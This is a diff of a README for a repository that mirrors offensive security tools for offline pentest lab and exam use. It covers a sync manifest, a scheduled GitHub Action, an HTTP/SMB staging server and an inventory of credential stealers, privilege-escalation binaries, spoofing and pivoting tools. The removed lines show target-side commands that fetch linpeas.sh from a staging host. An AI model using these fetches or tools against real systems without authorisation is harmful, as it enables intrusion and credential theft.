@@ -1,60 +1,36 @@
 # cyber-tools
 
-Offline vendoring repository for curated cybersecurity tools. A manifest declares each tool and how to fetch it; a sync engine pulls updates; a scheduled GitHub Action commits only when something actually changed.
+Offline repository for curated cybersecurity tools. A manifest file declares each tool and how to fetch it; a sync engine pulls updates; a scheduled GitHub Action commits only when something actually changed.
 
 ## Layout
 
 ```
 cyber-tools/
-├── tools.json                  # declare each tool + how to grab it
-├── sync.sh                     # the sync engine
-├── scripts/
-│   ├── install.sh              # one-step sync + extras (AccessChk, extract Python)
-│   └── serve.sh                # one-command HTTP + SMB staging server
-├── .github/workflows/sync.yml  # daily cron + manual trigger
-└── tools/                      # auto-populated, one dir per tool
+├── tools.json                 # declare each tool + how to grab it
+├── tool_sync.sh               # the sync engine
+├── tool_download_extras.sh    # sync + extras (AccessChk, extract Python)
+├── serve.sh                   # one-command HTTP + SMB staging server
+├── .github/workflows/         # twice-weekly cron + manual trigger
+└── tools/                     # flat binaries/scripts; code repos keep their own folders
 ```
 
 ## Quick start
 
 ```bash
-chmod +x sync.sh scripts/*.sh
-./scripts/install.sh
+chmod +x tool_sync.sh tool_download_extras.sh serve.sh
+./tool_download_extras.sh
 ```
 
 Optional: pass a GitHub token to raise API rate limits during sync:
 
 ```bash
-GITHUB_TOKEN=<PAT> ./scripts/install.sh
+GITHUB_TOKEN=<PAT> ./tool_download_extras.sh
 ```
 
-## Staging server (HTTP + SMB)
-
-After install, stand up a file server for exam/lab transfers with one command:
+## Staging server
 
 ```bash
-./scripts/serve.sh
-```
-
-Defaults:
-
-| Service | Default | Override |
-|---------|---------|----------|
-| HTTP | `http://0.0.0.0:8080/` | `HTTP_PORT=9000 ./scripts/serve.sh` |
-| SMB share | `\\<your-ip>\tools` | `SMB_SHARE=loot ./scripts/serve.sh` |
-| SMB credentials | `guest` / `guest` | `SMB_USER=... SMB_PASS=... ./scripts/serve.sh` |
-| Served directory | `./tools/` | `SERVE_DIR=/path/to/files ./scripts/serve.sh` |
-
-HTTP uses Python's built-in server. SMB uses `impacket-smbserver` (or `smbserver.py`) if installed (`pip install impacket`). Without impacket, HTTP still works and a warning is printed.
-
-Example target-side fetches:
-
-```powershell
-# HTTP
-curl http://10.10.14.5:8080/peass-ng/linpeas.sh -o linpeas.sh
-
-# SMB
-copy \\10.10.14.5\tools\peass-ng\linpeas.sh .
+SERVER_IP=0.0.0.0 HTTP_PORT=8080 SMB_SHARE=tools SMB_USER=guest SMB_PASS=guest SERVE_DIR=./tools ./serve.sh
 ```
 
 ## Acquisition strategies
@@ -63,9 +39,11 @@ Each entry in `tools.json` uses a `type` that selects one of three strategies:
 
 | Type | What it does |
 |------|--------------|
-| `release` | Fetches matching assets from the latest GitHub Release |
-| `file` | Raw-downloads specific file(s) from a repo at a given ref |
-| `repo` | Shallow-clones the repo and strips `.git` for offline use |
+| `release` | Fetches matching assets from the latest GitHub Release into `tools/` |
+| `file` | Raw-downloads specific file(s) from a repo at a given ref into `tools/` |
+| `repo` | Shallow-clones the repo into `tools/<name>/` and strips `.git` |
+
+Optional per-tool `rename` map rewrites each matched asset basename (regex → dest name). Use `"$lower"` to lowercase the matched name (current default for all tools).
 
 ## Adding a tool
 
@@ -75,67 +53,120 @@ Add one JSON object to the `tools` array in `tools.json`. No script edits requir
 
 ```json
 {
-  "name": "linpeas",
+  "name": "peass-ng",
   "type": "release",
   "repo": "peass-ng/PEASS-ng",
-  "assets": ["^linpeas\\.sh$", "^winPEASx64\\.exe$"]
+  "assets": ["^linpeas\\.sh$", "^winPEASx64\\.exe$"],
+  "rename": {
+    "^linpeas\\.sh$": "$lower",
+    "^winPEASx64\\.exe$": "$lower"
+  }
 }
 ```
-
-- `assets` — regexes matched against release asset filenames.
-- Writes `tools/<name>/.version` with the release tag; skips re-download when the tag is unchanged.
 
 ### File (specific paths, not a full clone)
 
 ```json
 {
-  "name": "my-script",
+  "name": "powersploit",
   "type": "file",
-  "repo": "owner/repo",
-  "ref": "main",
-  "paths": ["scripts/audit.sh"]
+  "repo": "PowerShellMafia/PowerSploit",
+  "ref": "master",
+  "paths": ["Privesc/PowerUp.ps1"],
+  "rename": {
+    "^PowerUp\\.ps1$": "$lower"
+  }
 }
 ```
-
-- `ref` — branch or tag (defaults to `main` if omitted).
-- `paths` — repo-relative paths; directory structure is preserved under `tools/<name>/`.
 
 ### Repo (full shallow clone)
 
 ```json
 {
-  "name": "my-tool",
+  "name": "ligolo-ng",
   "type": "repo",
-  "repo": "owner/repo",
-  "ref": "main"
+  "repo": "nicocha30/ligolo-ng",
+  "ref": "master"
 }
 ```
 
-- Re-fetched every sync run; Git diff detection avoids empty commits when nothing changed upstream.
-
-## Extras fetched by install.sh
+## Extras fetched by tool_download_extras.sh
 
 Some tools are not in `tools.json` because they have no suitable GitHub source:
 
-- **AccessChk** — downloaded from the official Sysinternals endpoint (`live.sysinternals.com`) into `tools/accesschk/`. This is the known-good source for `accesschk.exe` and `accesschk64.exe`.
-- **Portable Python** — the `static-python` release tarball is extracted automatically after sync.
+- **AccessChk** — downloaded from Sysinternals (`live.sysinternals.com`) as `tools/accesschk.exe` and `tools/accesschk64.exe`.
+- **Portable Python** — the `static-python` release tarball is extracted into `tools/python/` after sync.
 
 ## Local testing
 
 ```bash
-chmod +x sync.sh
-GITHUB_TOKEN=<PAT> ./sync.sh
+chmod +x tool_sync.sh
+GITHUB_TOKEN=<PAT> ./tool_sync.sh
 ```
 
 `GITHUB_TOKEN` is optional locally but recommended — it is sent only on GitHub API calls (not asset downloads) to raise the rate limit.
 
 ## GitHub Action setup
 
-The workflow runs daily at 06:00 UTC and on manual trigger (`workflow_dispatch`). It runs `sync.sh`, stages all changes, and commits/pushes only when `git diff --cached` is non-empty.
+The workflow runs twice a week (Monday and Thursday at 06:00 UTC) and on manual trigger (`workflow_dispatch`). It runs `tool_sync.sh`, stages all changes, and commits/pushes only when `git diff --cached` is non-empty.
 
 **Required repo setting:** Settings → Actions → General → Workflow permissions → **Read and write permissions**.
 
-## Stretch goals (not implemented)
+## Tool inventory
 
-- Pin tools to a specific tag or commit SHA for reproducible builds.
-- Per-tool post-fetch build hooks (e.g. compile Go/Rust tools in CI before commit).
+| Filename | Description |
+|----------|-------------|
+| `accesschk.exe` | [Sysinternals access checker (x86)](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) |
+| `accesschk64.exe` | [Sysinternals access checker (x64)](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) |
+| `bloodhound-cli-linux-amd64.tar.gz` | [BloodHound CLI for Linux](https://github.com/SpecterOps/bloodhound-cli) |
+| `cpython-3.11.15+20260807-x86_64-pc-windows-msvc-install_only.tar.gz` | [Standalone Windows Python build](https://github.com/indygreg/python-build-standalone) |
+| `domainpasswordspray.ps1` | [AD password spraying script](https://github.com/dafthack/DomainPasswordSpray) |
+| `firefox_decrypt.py` | [Firefox password decryptor](https://github.com/unode/firefox_decrypt) |
+| `godpotato-net2.exe` | [Potato priv-esc for .NET 2](https://github.com/BeichenDream/GodPotato) |
+| `godpotato-net35.exe` | [Potato priv-esc for .NET 3.5](https://github.com/BeichenDream/GodPotato) |
+| `godpotato-net4.exe` | [Potato priv-esc for .NET 4](https://github.com/BeichenDream/GodPotato) |
+| `hack-browser-data-windows-64bit.zip` | [Browser credential extractor](https://github.com/moonD4rk/HackBrowserData) |
+| `houndcollector.sh` | [RootHound collector helper](https://github.com/Noz2/RootHound) |
+| `inveigh-net10.0-win-x64-trimmed-single-v2.0.12.zip` | [Windows mitm/spoofing toolkit](https://github.com/Kevin-Robertson/Inveigh) |
+| `john.smith.txt` | [Likely username wordlist](https://github.com/insidetrust/statistically-likely-usernames) |
+| `johnsmith.txt` | [Likely username wordlist](https://github.com/insidetrust/statistically-likely-usernames) |
+| `jsmith.txt` | [Likely username wordlist](https://github.com/insidetrust/statistically-likely-usernames) |
+| `jsmith2.txt` | [Likely username wordlist](https://github.com/insidetrust/statistically-likely-usernames) |
+| `juicypotato.exe` | [Windows potato priv-esc](https://github.com/ohpe/juicy-potato) |
+| `kerbrute_linux_amd64` | [Kerberos user enum (Linux)](https://github.com/ropnop/kerbrute) |
+| `kerbrute_windows_amd64.exe` | [Kerberos user enum (Windows)](https://github.com/ropnop/kerbrute) |
+| `lapstoolkit.ps1` | [LAPS enumeration toolkit](https://github.com/leoloobeek/LAPSToolkit) |
+| `lazagne.exe` | [Credential recovery tool](https://github.com/AlessandroZ/LaZagne) |
+| `ligolo-ng/` | [Tunneling / pivoting toolkit](https://github.com/nicocha30/ligolo-ng) |
+| `linpeas.sh` | [Linux priv-esc enumerator](https://github.com/peass-ng/PEASS-ng) |
+| `lse.sh` | [Linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration) |
+| `nc-x64` | [Static netcat Linux x64](https://github.com/mermehr/static-binaries) |
+| `nc-x64.exe` | [Static netcat Windows x64](https://github.com/mermehr/static-binaries) |
+| `nc-x86` | [Static netcat Linux x86](https://github.com/mermehr/static-binaries) |
+| `nc-x86.exe` | [Static netcat Windows x86](https://github.com/mermehr/static-binaries) |
+| `nmap` | [Static nmap Linux binary](https://github.com/andrew-d/static-binaries) |
+| `nmap.exe` | [Static nmap Windows binary](https://github.com/andrew-d/static-binaries) |
+| `powerhuntshares.psm1` | [Share hunting PowerShell module](https://github.com/NetSPI/PowerHuntShares) |
+| `powerup.ps1` | [Windows priv-esc checks](https://github.com/PowerShellMafia/PowerSploit) |
+| `powerview.ps1` | [AD situational awareness](https://github.com/PowerShellMafia/PowerSploit) |
+| `pretender_linux_x86_64.tar.gz` | [LLMNR/NBT-NS/mDNS spoofing](https://github.com/RedTeamPentesting/pretender) |
+| `pretender_windows_x86_64.zip` | [LLMNR/NBT-NS/mDNS spoofing](https://github.com/RedTeamPentesting/pretender) |
+| `printerbug.py` | [MS-RPRN coercion helper](https://github.com/dirkjanm/krbrelayx) |
+| `printspoofer32.exe` | [PrintSpooler priv-esc (x86)](https://github.com/itm4n/PrintSpoofer) |
+| `printspoofer64.exe` | [PrintSpooler priv-esc (x64)](https://github.com/itm4n/PrintSpoofer) |
+| `pspy32` | [Linux process monitor (x86)](https://github.com/DominicBreuker/pspy) |
+| `pspy64` | [Linux process monitor (x64)](https://github.com/DominicBreuker/pspy) |
+| `pssqlite.psd1` | [SQLite PowerShell module](https://github.com/RamblingCookieMonster/PSSQLite) |
+| `roguepotato.zip` | [RoguePotato priv-esc package](https://github.com/antonioCoco/RoguePotato) |
+| `roothound.py` | [RootHound AD collector](https://github.com/Noz2/RootHound) |
+| `runascs.zip` | [RunasCs privilege tool](https://github.com/antonioCoco/RunasCs) |
+| `seatbelt.exe` | [GhostPack host survey](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) |
+| `sharpup.exe` | [GhostPack priv-esc checks](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) |
+| `smtp-user-enum` | [SMTP user enumeration](https://github.com/cytopia/smtp-user-enum) |
+| `snaffler.exe` | [AD share content finder](https://github.com/SnaffCon/Snaffler) |
+| `socat` | [Static socat Linux binary](https://github.com/andrew-d/static-binaries) |
+| `socatx64.exe` | [Static socat Windows x64](https://github.com/3ndG4me/socat) |
+| `socatx86.exe` | [Static socat Windows x86](https://github.com/3ndG4me/socat) |
+| `sweetpotato.exe` | [SweetPotato priv-esc](https://github.com/uknowsec/SweetPotato) |
+| `winpeasx64.exe` | [Windows priv-esc enumerator](https://github.com/peass-ng/PEASS-ng) |
+| `winpeasx86.exe` | [Windows priv-esc enumerator](https://github.com/peass-ng/PEASS-ng) |
